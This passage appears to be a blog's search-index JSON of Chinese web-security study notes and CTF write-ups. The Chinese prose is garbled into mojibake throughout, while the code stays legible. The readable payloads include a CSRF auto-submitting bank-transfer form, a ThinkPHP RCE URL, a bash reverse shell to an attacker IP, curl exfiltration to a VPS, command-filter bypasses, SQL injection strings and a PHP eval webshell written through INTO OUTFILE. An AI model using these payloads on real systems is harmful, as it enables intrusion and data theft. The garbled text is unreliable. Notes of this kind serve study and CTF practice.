DOMå‹ï¼šä¸éœ€è¦ä»¥æ¥æœåŠ¡ç«¯ç›¸åº”å†…å®¹ï¼Œå¦‚æœHTMLé¡µé¢ä¸­ä½¿ç”¨äº†document.locationç­‰DOMå…ƒç´ çš„å±æ€§ï¼Œæ”»å‡»è€…å°±å¯ä»¥åˆ©ç”¨è¿™äº›å±æ€§æ³¨å…¥æ¶æ„è„šæœ¬å®æ–½åŸºäºDOMçš„è·¨ç«™è„šæœ¬æ”»å‡»\n\n<!--more-->\n\n#### DOMï¼š\n\nDocument Object Modelï¼ˆæ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼‰ï¼Œé€šè¿‡HTLM DOMï¼Œæ ‘ä¸­æ‰€æœ‰èŠ‚ç‚¹éƒ½å¯é€šè¿‡JavaScriptè¿›è¡Œè®¿é—®ï¼Œä¿®æ”¹ï¼Œåˆ›å»ºï¼Œåˆ é™¤\n\n![DOMç¤ºæ„](/images/DOMç¤ºæ„.png)\n\nXSSç›²æ‰“ï¼š\n\næ„æ¶scriptæ ‡ç­¾ä½¿å—å®³è€…æ‰§è¡Œï¼Œé€šè¿‡document.locationå’Œdocument.cookieè·å–åˆ°å—å®³è€…çš„cookieåŠç®¡ç†é¡µé¢ç­‰éšç§å†…å®¹å¯¼è‡´ç½‘ç«™å†…å®¹æ³„æ¼\n\n```html\n<sCRiPt sRC=></sCrIpT>\n```\n\n\n\n#### CSRFï¼š\n\nè·¨ç«™è¯·æ±‚ä¼ªé€ \n\næ”»å‡»æµç¨‹ï¼šé€šè¿‡è·å–å—å®³çš„Cookieç­‰ä¿¡æ¯ï¼Œä¼ªé€ å¯¹åº”ç”¨æˆ·çš„è¯·æ±‚å¤´ï¼Œé€šè¿‡ç”¨æˆ·èº«ä»½![CSRF](/images/CSRF.jpg)\n\nä½¿ç”¨æ–¹æ³•ï¼šåˆ¶ä½œç½‘ç«™æ—¶å¯é€šè¿‡æ„é€ imgæ ‡ç­¾ç›´æ¥è®¿é—®ï¼Œå¦‚\n\n```html\n<img src=\"http://www.myBank.com/Transfer.php?toBankId=1111&money=1000\">\n```\n\næˆ–è€…é€šè¿‡JavaScriptæ„é€ postè¯·æ±‚å¹¶é€šè¿‡domå…ƒç´ ç›´æ¥æäº¤ï¼Œå¦‚\n\n```html\n<html>\nã€€ã€€<head>\nã€€ã€€ã€€ã€€<script type=\"text/javascript\">\nã€€ã€€ã€€ã€€ã€€ã€€function steal()\nã€€ã€€ã€€ã€€ã€€ã€€{\n          ã€€ã€€ã€€ã€€ iframe = document.frames[\"steal\"];\nã€€ã€€     ã€€ã€€      iframe.document.Submit(\"transfer\");\nã€€ã€€ã€€ã€€ã€€ã€€}\nã€€ã€€ã€€ã€€</script>\nã€€ã€€</head>\n\nã€€ã€€<body onload=\"steal()\">//é¡µé¢å®Œå…¨è½½å…¥åè§¦å‘\nã€€ã€€ã€€ã€€<iframe name=\"steal\" display=\"none\">\nã€€ã€€ã€€ã€€ã€€ã€€<form method=\"POST\" name=\"transfer\"ã€€action=\"http://www.myBank.com/Transfer.php\">\nã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€<input type=\"hidden\" name=\"toBankId\" value=\"11\">\nã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€<input type=\"hidden\" name=\"money\" value=\"1000\">\nã€€ã€€ã€€ã€€ã€€ã€€</form>\nã€€ã€€ã€€ã€€</iframe>\nã€€ã€€</body>\n</html>\n```\n\næˆ–è€…å®Œå…¨ä¼ªé€ åŸè¡¨å•ï¼Œå¹¶ä¸”å¡«å†™å¥½å†…å®¹ï¼Œé€šè¿‡javascriptç›´æ¥æäº¤\n\n```html\n<body>\n    <form method=\"post\" action=\"money.php\" id=\"mon\">\n        ç”¨æˆ·åï¼š<input type=\"text\" name=\"user\" id=\"user\" value=\"Jlan\">\n        è½¬è´¦äººï¼š<input type=\"money\" name=\"money\" id=\"pass\" value=\"100000\">\n    </form>\n    <script>\n        document.getElementById(\"mon\").submit()\n    </script>\n</body>\n```\n\n#### SSRFï¼š\n\næœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ \n\næ”»å‡»æµç¨‹ï¼šé€šè¿‡é¡µé¢ä¸­å¯è®¿é—®å…¶ä»–é¡µé¢çš„ä½ç½®é€šè¿‡æœåŠ¡ç«¯å‘èµ·è¯·æ±‚è¿›è€Œè·å–åˆ°å®¢æˆ·ç«¯æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿ\n\næ”»å‡»ä½ç½®ï¼šæœ‰åœ¨çº¿ç¿»è¯‘ï¼Œé¡µé¢æ”¶è—ï¼Œå›¾ç‰‡åŠ è½½ä¸‹è½½ç­‰\n","tags":["CTF","web"]},{"title":"Pythoné¢å‘å¯¹è±¡","url":"/2022/01/11/Pythoné¢å‘å¯¹è±¡/","content":"\n# Pythoné¢å‘å¯¹è±¡\n\n#### ç±»çš„å®šä¹‰ï¼š\n\n```python\n#objectæ˜¯æ‰€æœ‰ç±»çš„åŸºç±»\n#æ¯ä¸ªå¯¹è±¡ä¼šä¿å­˜è‡ªå·±çš„å±æ€§ï¼Œä¸åŒå¯¹è±¡é—´å±æ€§æ²¡æœ‰å¿…ç„¶è”ç³»\n#ç±»å†…éƒ¨å¯é€šè¿‡selfæ“ä½œ\nclass ç±»å(object):\n  def å‡½æ•°å(self):\n    æ–¹æ³•å†…å®¹\n\t\n```\n\n<!--more-->\n\n#### ç±»å¤–æ“ä½œå¯¹è±¡å±æ€§ï¼š\n\n```python\nå¯¹è±¡å.å±æ€§å=å±æ€§å†…å®¹#ç»™ç±»æ·»åŠ æˆ–ä¿®æ”¹å±æ€§\n```\n\n#### é­”æ³•æ–¹æ³•ï¼š\n\nè¿™ç±»æ–¹æ³•ä»¥åŒä¸‹åˆ’çº¿å¼€å¤´å’Œç»“å°¾ï¼Œåœ¨æ»¡è¶³æŸç§ç‰¹å®šæ¡ä»¶æ˜¯ä¼šè°ƒç”¨è¿™ç§æ–¹æ³•\n\n```python\n#åˆ›å»ºå¯¹è±¡åä¼šç«‹å³è°ƒç”¨\n#ä½¿ç”¨æ—¶ç±»ä¼¼æ„é€ å‡½æ•°\n__init__(self,å‚æ•°1,å‚æ•°2)\n```\n\n```python\n#è¯¥æ–¹æ³•è¿”å›å€¼ä¸ºå­—ç¬¦ä¸²ï¼Œåœ¨ä½¿ç”¨print(å¯¹è±¡)æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨\n#è¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬æ¢æ—¶ä¹Ÿä¼šè‡ªåŠ¨è°ƒç”¨\n__str__(self)\n```\n\n```python\n#å¯¹è±¡åœ¨å†…å­˜ä¸­è¢«é”€æ¯æ—¶ä¼šè°ƒç”¨\n#ä½¿ç”¨æ—¶ç±»ä¼¼ææ„å‡½æ•°ï¼Œå¯ä½¿ç”¨del å˜é‡åè¿›è¡Œé”€æ¯\n__del__(self)\n```\n\n","tags":["Note","Python"]},{"title":"PythonåŸºç¡€","url":"/2022/01/11/PythonåŸºç¡€/","content":"\n# PythonåŸºç¡€\n\n#### æ•°æ®ç±»å‹ï¼š\n\nstringï¼ˆå­—ç¬¦ä¸²ï¼‰\n\nnumï¼ˆæ•°å­—ï¼‰\n\nboolï¼ˆå¸ƒå°”ï¼‰\n\nlistï¼ˆåˆ—è¡¨ï¼‰ä½¿ç”¨[    ]å®šä¹‰\n\ntupleï¼ˆå…ƒç»„ï¼‰ä½¿ç”¨{     }å®šä¹‰ï¼ˆæ— åºï¼‰\n\ndictionaryï¼ˆå­—å…¸ï¼‰ä½¿ç”¨{     }å®šä¹‰ï¼Œå†…å®¹ä¸ºï¼šä¸‹æ ‡å:å…ƒç´ å†…å®¹\n\n<!--more-->\n\n#### å­—ç¬¦ä¸²ç›¸å…³å‡½æ•°ï¼š\n\n###### æŸ¥æ‰¾ï¼š\n\n```python\nstr.find(str1,start,end)//rfindä»æœ«å°¾å¼€å§‹æŸ¥æ‰¾\nstr.index(str1,start,end)//rindexä»æœ«å°¾å¼€å§‹æŸ¥æ‰¾\n```\n\nåœ¨å­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨str1ï¼Œå­˜åœ¨è¿”å›ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œä¸å­˜åœ¨findè¿”å›-1ï¼ŒindexæŠ¥é”™\n\n```python\nstr.count(str1,start,end)\n```\n\næŸ¥æ‰¾å­—ç¬¦ä¸²ä¸­æŸå­—ç¬¦ä¸²å‡ºç°çš„æ¬¡æ•°\n\n###### æ›¿æ¢ï¼š\n\n```python\nstr.replace(old,new,count)\n```\n\nå°†å­—ç¬¦ä¸²ä¸­oldå†…å®¹æ›¿æ¢ä¸ºnewï¼Œcountä¸ºæœ€å¤§æ›¿æ¢æ¬¡æ•°ï¼Œè¿”å›æ–°å­—ç¬¦ä¸²ï¼Œä¸æ”¹å˜åŸæ¥å­—ç¬¦ä¸²\n\n###### åˆ‡å‰²ï¼š\n\n```python\nstr.split(str1,count)\n```\n\nå°†å­—ç¬¦ä¸²ä»¥str1ä¸ºåˆ†éš”åˆ‡å‰²ï¼Œcountä¸ºæœ€å¤§åˆ‡å‰²æ¬¡æ•°ï¼Œè¿”å›ä¸€ä¸ªåˆ—è¡¨ï¼Œä¸æ”¹å˜åŸæœ‰å­—ç¬¦ä¸²ï¼Œé»˜è®¤æŒ‰ç©ºç™½å­—ç¬¦è¿›è¡Œå…¨åˆ‡å‰²\n\n###### åŠ å…¥ï¼š\n\n```python\nstr.join(å¯è¿­ä»£å¯¹è±¡)\n```\n\nå°†stræ’å…¥åˆ°å¯è¿­ä»£å¯¹è±¡ä¸¤ä¸ªå…ƒç´ ä¹‹é—´ï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²\n\n###### ä¹±ä¸ƒå…«ç³Ÿï¼š\n\n```python\ncapitalize(str)//å°†å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ªå­—æ¯å¤§å†™\ntitle(str)//å­—ç¬¦ä¸²ä¸­æ¯ä¸ªå•è¯é¦–å­—æ¯å¤§å†™\nstr.startwith(str1)//æ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦ä»¥str1å¼€å¤´\nstr.endwith(str1)//æ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦ä»¥str1ç»“å°¾\nstr.upper()//å­—æ¯å…¨å¤§å†™\nstr.lower()//å­—æ¯å…¨å°å†™\n```\n\n\n\n\n\ninputè¾“å…¥\n\nprintè¾“å‡º\n\nreadè¯»æ–‡ä»¶ï¼ˆæŒ‰å­—èŠ‚è¯»ï¼‰ï¼Œreadlineï¼ˆæŒ‰è¡Œè¯»ï¼‰\n\nopen(\"æ–‡ä»¶å\"ï¼Œ\"æ‰“å¼€æ–¹å¼ï¼ˆråªè¯»ï¼Œwå†™å…¥ï¼Œaè¿½åŠ ï¼Œï¼ˆbï¼‰ä»£è¡¨ä»¥äºŒè¿›åˆ¶æ‰“å¼€ï¼Œï¼ˆ+ï¼‰ä»£è¡¨è¯»å†™ï¼‰\"ï¼Œencoding=\"ç¼–ç æ–¹å¼\")æ‰“å¼€æ–‡ä»¶ï¼ˆä»¥äºŒè¿›åˆ¶è¿›è¡Œè¯»å†™æ—¶ä¸èƒ½æŒ‡å®šencodingæ–¹å¼ï¼‰\n\n*argsä¸å®šé•¿å‚æ•°ï¼Œæ¥æ”¶åç”Ÿæˆå…ƒç»„\n\n**kwargsä¸å®šé•¿å‚æ•°ï¼Œæ¥æ”¶åç”Ÿæˆå­—å…¸\n\n#### Pythonå†…å­˜ç®¡ç†æœºåˆ¶ï¼šå¼•ç”¨è®¡æ•°\n\n```python\na=1 #aåœ°å€å¼•ç”¨ä¸º1\nb=a #aåœ°å€å¼•ç”¨ä¸º2\ndel a #aåœ°å€å¼•ç”¨ä¸º1\ndel b #aåœ°å€å¼•ç”¨ä¸º0ï¼Œæ­¤æ—¶aå¼•ç”¨åœ°å€è¢«é”€æ¯\n```\n\n","tags":["Python"]},{"title":"CTFShow çˆ†ç ´web25","url":"/2022/01/08/CTFShow çˆ†ç ´web25/","content":"\n# CTFShow çˆ†ç ´web25\n\né¦–å…ˆæŸ¥çœ‹ä»£ç \n\n```php\n<?php\nerror_reporting(0);\ninclude(\"flag.php\");\nif(isset($_GET['r'])){\n    $r = $_GET['r'];\n    mt_srand(hexdec(substr(md5($flag), 0,8)));\n    $rand = intval($r)-intval(mt_rand());\n    if((!$rand)){\n        if($_COOKIE['token']==(mt_rand()+mt_rand())){\n            echo $flag;\n        }\n    }else{\n        echo $rand;\n    }\n}else{\n    highlight_file(__FILE__);\n    echo system('cat /proc/version');\n}\n?>\n```\n\n<!--more-->\n\nå‘ç°ä¼ å…¥å€¼æœ‰rï¼Œcookieéœ€è¦è¿›è¡Œä¼ªé€ ï¼Œå…ˆéšä¾¿ä¼ å…¥ä¸€ä¸ªrï¼Œå‘ç°å¤šæ¬¡åˆ·æ–°åæ˜¾ç¤ºçš„å€¼ç›¸åŒï¼Œè¯´æ˜éšæœºæ•°ç”Ÿæˆçš„ç»“æœç›¸åŒï¼Œéƒ½æ˜¯949254252\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/web251.png)\n\næŸ¥è¯¢åå¾—çŸ¥\n\n```\nmt_srand()//ä»¥ä¼ å…¥å˜é‡ä½œä¸ºç§å­åˆ†å‘\nmt_rand()//ä»¥ç§å­ç”Ÿæˆéšæœºæ•°\n```\n\nç”±äºæ¯æ¬¡çš„seedç›¸åŒï¼Œæ‰€ä»¥ç”Ÿæˆçš„éšæœºæ•°ç›¸åŒï¼Œå°è¯•æ„é€ payload\n\n```\n?r=949254252 Cookie: token=1898508504\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/web252.png)\n\nç»“æœå‘ç°å¤±è´¥ï¼ŒæŸ¥çœ‹æç¤ºï¼Œå‘ç°æ˜¯åœ¨å¤šæ¬¡æ‰ç”¨mt_rand()æ—¶ç”Ÿæˆçš„éšæœºæ•°ä¸ç§å­æœ‰å…³ä½†å¹¶ä¸ç›¸ç­‰ï¼Œæ‰€ä»¥ä¸èƒ½ç®€å•ç”¨token=2*mt_rand()è§£å†³ï¼Œä½¿ç”¨æç¤ºä¸­ç»™å‡ºçš„è„šæœ¬è®¡ç®—å‡ºseedï¼Œæ”¾å…¥PHPç¯å¢ƒä¸­å®éªŒ\n","tags":["CTF","web"]},{"title":"æ¨¡ç‰ˆæ¼æ´","url":"/2022/01/08/æ¨¡ç‰ˆæ¼æ´/","content":"\n# æ¨¡ç‰ˆæ¼æ´\n\n### ThinkPHP V5æ¼æ´ï¼š\n\n```url\n?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=PHPå‡½æ•°å&vars[1][]=PHPå‡½æ•°å‚æ•°1&vars[1][]=PHPå‡½æ•°å‚æ•°2\n```\n\nè¯¥æ¼æ´å¯ç”¨äºæ‰§è¡ŒPHPå‡½æ•°\n\n<!--more-->\n","tags":["Note","CTF","web"]},{"title":"RCEè¿œç¨‹ä»£ç æ‰§è¡Œ","url":"/2022/01/08/RCEè¿œç¨‹ä»£ç æ‰§è¡Œ/","content":"\n# **RCEè¿œç¨‹ä»£ç æ‰§è¡Œ**\n\n#### **ä¸€ã€RCEèƒ½åšåˆ°ä»€ä¹ˆï¼š**\n\n1ã€æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ 2ã€è®°å½•ç”¨æˆ·è¾“å…¥ 3ã€æ§åˆ¶é”®ç›˜é¼ æ ‡ 4ã€ä»»æ„ä¸Šä¼ ä¸‹è½½ 5ã€æˆªå±\n\n<!--more-->\n\n#### **äºŒã€RCEäº§ç”ŸåŸå› ï¼š**\n\n1ã€æœåŠ¡å™¨ä¸Šæœ‰æœ¨é©¬ \n\n2ã€è„†å¼±æœåŠ¡æœªæˆæƒ\n\n3ã€é€šè¿‡æ•°æ®åº“å†™æœ¨é©¬ \n\n4ã€æ–‡ä»¶ä¸Šä¼ /æ–‡ä»¶åŒ…å« \n\n5ã€å±é™©å‡½æ•°ï¼ˆevalï¼Œassertï¼Œsystemï¼Œshell_execï¼Œexecï¼Œfile_put_contentsï¼‰ \n\n6ã€å‘½ä»¤æ‰§è¡Œ \n\n7ã€ååºåˆ—åŒ–\n\n#### **ä¸‰ã€RCEè¿œç¨‹ä»£ç æ‰§è¡Œå…³é”®ç‚¹ï¼š**\n\n##### **1ã€RCEé»‘åå•è¿‡æ»¤ï¼š**\n\nlinuxæ‰§è¡Œå‘½ä»¤ç‰¹æ®Šå­—ç¬¦ï¼šï¼ˆ;åˆ†å‰²å‘½ä»¤ï¼‰ï¼ˆ&&åœ¨å‰ä¸€ä¸ªå‘½ä»¤æ‰§è¡ŒæˆåŠŸçš„å‰æä¸‹æ‰§è¡Œåé¢å‘½ä»¤ï¼‰ï¼ˆ||å‰ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œå¤±è´¥çš„å‰æä¸‹æ‰§è¡Œåé¢å‘½ä»¤ï¼‰ï¼ˆ|å°†å‰é¢å‘½ä»¤æ‰§è¡Œçš„ç»“æœä½œä¸ºè¾“å…¥ï¼Œè¾“å…¥åˆ°åé¢å‘½ä»¤ä¸­æ‰§è¡Œï¼‰ï¼ˆ``å°†å‘½ä»¤æ‰§è¡Œç»“æœä½œä¸ºå‘½ä»¤å†æ¬¡æ‰§è¡Œï¼‰ï¼ˆ$()å’Œå‰ä¸€ä¸ªä¸€æ ·ï¼‰\n\nè¿‡æ»¤ç©ºæ ¼åå¯ä½¿ç”¨<å‘å‘½ä»¤ä¼ å…¥å‚æ•°ï¼Œ${IFS}ä¸ºç©ºæ ¼ï¼Œ%0aä¸ºåˆ†å·è½¬è¯‘\n\n`catç»•è¿‡å¯ä½¿ç”¨tac more less head tac tail nl od(äºŒè¿›åˆ¶æŸ¥çœ‹) vi vim sort uniq`\n\n`ç»•è¿‡ç©ºæ ¼ç”¨%09 <> ${IFS} $IFS$9 {cat,fl*} %20`\n\n`flagç»•è¿‡å¯ä½¿ç”¨é€šé…ç¬¦f*`\n\n##### **2ã€RCEæ— å›æ˜¾ï¼š**\n\nï¼ˆ1ï¼‰ã€åå¼¹shellï¼šæ”»å‡»ç«¯ç›‘å¬ä¸€ä¸ªç«¯å£å¦‚ï¼š2333 \n\nâ€‹\tæ”»å‡»ç«¯ä½¿ç”¨ï¼š\n\n```shell\nnc -lvp ç›‘å¬çš„ç«¯å£\n```\n\nâ€‹\tå—å®³ç«¯ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ç”Ÿæˆä¸€ä¸ªåå¼¹shellï¼š\n\n```shell\nbash -i >& /dev/tcp/æ”»å‡»ç«¯IP/æ”»å‡»ç«¯ç›‘å¬ç«¯å£ 0>&1\n```\n\nâ€‹\tåœ¨æ”»å‡»ç«¯ç»ˆç«¯å³å¯åœ¨å—å®³ç«¯ä¸­æ‰§è¡Œå‘½ä»¤\n\nï¼ˆ2ï¼‰ã€dnslogï¼šé€šè¿‡ping $(å‘½ä»¤).åŸŸå é€šè¿‡è¿™ç§æ–¹å¼è·å–å‘½ä»¤æ‰§è¡Œç»“æœ\n\nï¼ˆ3ï¼‰ã€å†™æ–‡ä»¶ï¼šå°†å‘½ä»¤æ‰§è¡Œç»“æœå†™å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œä½¿ç”¨echoå‘½ä»¤ï¼š\n\n```shell\necho \"å†™å…¥å†…å®¹\">test.txt\n```\n\nï¼ˆ4ï¼‰ã€curlç­‰ç½‘ç»œå‘½ä»¤ï¼šé€šè¿‡POSTç­‰æ–¹å¼ç›´æ¥ç»™åˆ°ä¸ªäººç§æœ‰VPSä¸­\n\n```shell\ncurl -d \"key1=value1&key2=value2&key3=value3\" protocol://ip:port/path\n```\n\n##### **3ã€RCEåå‘ç°ä¸å‡ºç½‘**\n\nï¼ˆ1ï¼‰ã€å†™æ–‡ä»¶\n\nï¼ˆ2ï¼‰ã€å‘½ä»¤ç›²æ³¨ï¼šå‘½ä»¤||sleep 100\n\nï¼ˆ3ï¼‰ã€éšè”½ä¿¡é“\n\n##### 4ã€å­—ç¬¦ç»•è¿‡\n\nï¼ˆ1ï¼‰ã€\n\n```\nä½¿ç”¨''æˆ–\"\"éš”æ–­å­—ç¬¦ä¸²\n```\n\nï¼ˆ2ï¼‰ã€ç©ºæ ¼å¯ä½¿ç”¨ï¼š<ï¼Œ<>ï¼Œ${IFS}ï¼Œ$IFSï¼Œ%20(space)ï¼Œ%09(tab)ï¼Œ$IFS$9ï¼Œ$IFS$1 æ›¿æ¢\n\nï¼ˆ3ï¼‰ã€åˆ†å·å¯ä½¿ç”¨ï¼š%0aï¼Œ%0dï¼Œ%0Dï¼Œ%0A æ›¿æ¢\n\nï¼ˆ4ï¼‰ã€ä½¿ç”¨base64ç¼–ç ï¼šY2F0IGZsYWcucGhw|base64ï¼Œå°†å…¶ä¸­å†…å®¹è§£ç åæ‰§è¡Œ\n\nï¼ˆ5ï¼‰ã€ä½¿ç”¨`åå¼•å·åŒ…è£¹å‘½ä»¤ï¼Œå°†å…¶ä¸­å†…å®¹ä½œä¸ºå‰ä¸€å‘½ä»¤çš„è¾“å…¥\n\n##### 5ã€å¯ç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°\n\nexec()ã€passthru()ã€system()ã€shell_exec()\n","tags":["Note","web","RCE"]},{"title":"SQLæ³¨å…¥ç¬”è®°","url":"/2022/01/08/SQLæ³¨å…¥ç¬”è®°/","content":"\n# **SQLæ³¨å…¥**\n\n1ã€é€šè¿‡order byçˆ†å‡ºå­—æ®µæ•°\n\n2ã€unionæ“ä½œï¼Œè”åˆæŸ¥è¯¢ï¼ŒæŸ¥è¯¢çš„æ˜¯åœ¨åŒä¸€ä¸ªæ•°æ®è¡¨çš„æ•°æ®ï¼Œé€šè¿‡union select 1,2,3â€¦,næ¥åˆ¤æ–­å›æ˜¾ä½ç½®\n\n3ã€information_schemaæ•°æ®åº“ï¼Œä¸ºmysqlè‡ªå¸¦æ•°æ®åº“ï¼Œæä¾›æ•°æ®åº“æºæ•°æ®è®¿é—®ï¼Œæœ€å¸¸ç”¨çš„æ˜¯\n\n**TABLESè¡¨**ï¼šæä¾›äº†å…³äºæ•°æ®åº“ä¸­è¡¨çš„ä¿¡æ¯\n\n**COLUMNSè¡¨**ï¼šæä¾›äº†è¡¨ä¸­åˆ—çš„ä¿¡æ¯\n\n<!--more-->\n\nçˆ†ç ´åº“åï¼š\n\n```mysql\nunion select 1,2,database()\n//é é”™è¯¯çˆ†å‡ºåº“å\nand exists(select * from aaa)\n//aaaè¡¨å¹¶ä¸å­˜åœ¨ï¼Œæ­¤æ—¶ä¼šæŠ¥é”™åœæ­¢å¹¶è¿”å›æ•°æ®åº“å.aaa\n```\n\nçˆ†ç ´è¡¨åï¼š\n\n```mysql\nunion select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()\nand exists(select * from è¡¨å)//çˆ†ç ´å‡ºè¡¨å\n```\n\nçˆ†ç ´åˆ—åï¼š\n\n```mysql\nunion select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\"æƒ³æŸ¥è¯¢çš„è¡¨å\"\nand exists(select åˆ—å from å·²çŸ¥è¡¨å)//çˆ†ç ´å‡ºåˆ—å\n```\n\n4ã€æŠ¥é”™æ³¨å…¥\n\nï¼ˆ1ï¼‰updatexmlï¼šæ›´æ–°XMLæ–‡æ¡£çš„å‡½æ•°\n\nè¯­æ³•ï¼š**updatexmlï¼ˆæ–‡æ¡£ç±»å‹ï¼Œxpathè·¯å¾„ï¼Œæ›´æ–°çš„å†…å®¹ï¼‰**\n\nä¾‹å­ï¼š\n\n```mysql\nand updatexml(0x0a,concat(0x0a,(select database())),â€™1â€™)\n```\n\n0x0aä»£è¡¨æ¢è¡Œç¬¦ï¼Œconcatæ‹¼æ¥\n\næ‹¼æ¥ç›®çš„ä¸ºä½¿å¾—æŸ¥è¯¢ç»“æœèƒ½å®Œå…¨æ˜¾ç¤ºå‡ºæ¥\n\nï¼ˆ2ï¼‰extractvalueï¼šå¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢çš„å‡½æ•°\n\nè¯­æ³•ï¼š**extractvalueï¼ˆæ–‡æ¡£ç±»å‹ï¼Œxpathè·¯å¾„ï¼‰**\n\næŠ¥é”™åŸç†ï¼šè·¯å¾„ä¸­å†™å…¥ä¸åˆæ³•çš„æ ¼å¼ï¼Œå°±ä¼šæŠ¥é”™å¹¶ä¸”è¿”å›æˆ‘ä»¬å†™å…¥çš„éæ³•æ ¼å¼å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªå¾—åˆ°æˆ‘ä»¬æƒ³å¾—åˆ°çš„å†…å®¹\n\n```mysql\nand (select extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema= 'sqli'))))\n```\n\næç¤ºï¼šæŠ¥é”™æœ€é•¿æ˜¾ç¤º30ä¸ªå­—ç¬¦å†…å®¹ï¼Œå¦‚æœå†…å®¹è¿‡é•¿å¯ä½¿ç”¨substrå‡½æ•°è¿›è¡Œæ‹†åˆ†\n\nâ€‹\tä¾‹é¢˜ï¼šCTFHubæŠ€èƒ½æ ‘web-SQLæ³¨å…¥-æŠ¥é”™æ³¨å…¥\n\nâ€‹\t![SQLError](/images/quiz/SQLError.png)\n\nâ€‹\té¦–å…ˆçˆ†ç ´åº“è¡¨åˆ—å\n\nâ€‹\t![SQLError2](/images/quiz/SQLError2.png)\n\nâ€‹\tè¿›è€Œå‘ç°flagè¿‡é•¿ç”¨substråˆ‡å‰²\n\nâ€‹\t![SQLError3](/images/quiz/SQLError3.png)\n\nâ€‹\tå¾—åˆ°flag\n\n5ã€ç›²æ³¨ï¼š\n\nå¸ƒå°”ç›²æ³¨ï¼šå›æ˜¾åªæœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€ç§æœ‰ä¸€ç§æ— \n\nifè¡¨è¾¾å¼ï¼šif(expr1,expr2,expr3)\n\nexpr1ä¸ºçœŸå°±è¿”å›expr2ï¼ˆå¯ç”¨äºæ‰§è¡Œå‡½æ•°ï¼‰\n\nsubstrå‡½æ•°ï¼šsubstr(å­—ç¬¦ä¸²,èµ·å§‹ä½ç½®,æˆªå–é•¿åº¦)\n\nasciiå‡½æ•°ï¼šå°†å‡½æ•°å†…å­—ç¬¦ä»¥asciiè¡¨è½¬æ¢ä¸ºæ•°å­—ï¼Œè€Œåå¯ä»¥è¿›è¡Œåˆ¤æ–­\n\n\n\næ—¶é—´ç›²æ³¨ï¼šæ— å›æ˜¾ï¼Œå¯ä»¥é€šè¿‡sleepå‡½æ•°åˆ¤æ–­æ˜¯å¦ä¸ºæ—¶é—´ç›²æ³¨\n\n~~å»ºè®®ç›´æ¥sqlmap~~\n\nï¼ˆ1ï¼‰ã€sleepå‡½æ•°çœ‹å»¶è¿Ÿæ—¶é—´\n\nï¼ˆ2ï¼‰ã€benchmark(æ‰§è¡Œæ¬¡æ•°,æ–¹å¼)ï¼Œæ‰§è¡Œè¶…å¤šæ¬¡çœ‹å»¶è¿Ÿæ—¶é—´\n\n6ã€å †å æ³¨å…¥ï¼šé€šè¿‡è¯­å¥åˆ†å‰²ç¬¦å·ï¼ˆ  ;  ï¼‰åˆ†éš”å¤šæ¡è¯­å¥ï¼Œç›´æ¥å°†æƒ³è¦çš„æ•°æ®æ’å…¥åˆ°è¡¨ä¸­ï¼Œç„¶åå†é€šè¿‡æŸ¥è¯¢è¯­å¥è¯»å–\n\n7ã€mysqlæ–‡ä»¶è¯»å†™ï¼šè¯»å–ï¼šload_fileå‡½æ•°ï¼šload_file(â€˜æ–‡ä»¶è·¯å¾„â€™)\n\nå†™å…¥ï¼š\n\n```mysql\nselect â€˜<?php eval($_POST[cmd]);?>â€™ into outfileæˆ–dumpfile 'ç»å¯¹è·¯å¾„';//å»ºè®®ç”¨dumpfileï¼Œå› ä¸ºoutfileä¼šåœ¨æ–‡ä»¶æœ«è¡Œå†™å…¥æ–°è¡Œï¼Œä½¿ç”¨çš„è½¬è¯‘æ¢è¡Œç¬¦ï¼Œä¼šç ´åæ–‡ä»¶å®Œæ•´æ€§ï¼Œå¯èƒ½å¯¼è‡´ä¸€å¥è¯æœ¨é©¬æ— æ³•æ‰§è¡Œ\n```\n\n8ã€å…³é”®è¯ç»•è¿‡ï¼šé€šè¿‡\n\nï¼ˆ1ï¼‰ã€set@aï¼šè®¾å®šä¸€ä¸ªè¯­å¥å˜é‡ set@sql=0x16è¿›åˆ¶æ•°\n\nï¼ˆ2ï¼‰ã€prepare : å­˜å‚¨ä¸€ä¸ªsqlè¯­å¥ å­˜åˆ°execsql é‡Œé¢ prepare execsql from @sql\n\nï¼ˆ3ï¼‰ã€execute :æ‰§è¡Œä¸€ä¸ªsqlè¯­å¥ execute execsql\n\nç”±äºè®¾å®šè¯­å¥å˜é‡æ—¶ï¼Œmysqlä¼šè‡ªåŠ¨å°†16è¿›åˆ¶æ•°æ®è½¬æ¢ä¸ºæ–‡å­—\n\n9ã€é›¶ç¢\n\n```mysql\nto_base64(å†…å®¹)//è¯¥è¯­å¥å°†å†…å®¹ç»è¿‡base64ç¼–ç åè¾“å‡º\nreplace(ori,old,new)\n```\n\n```\n%0a,/**/å¯ä»£æ›¿ç©ºæ 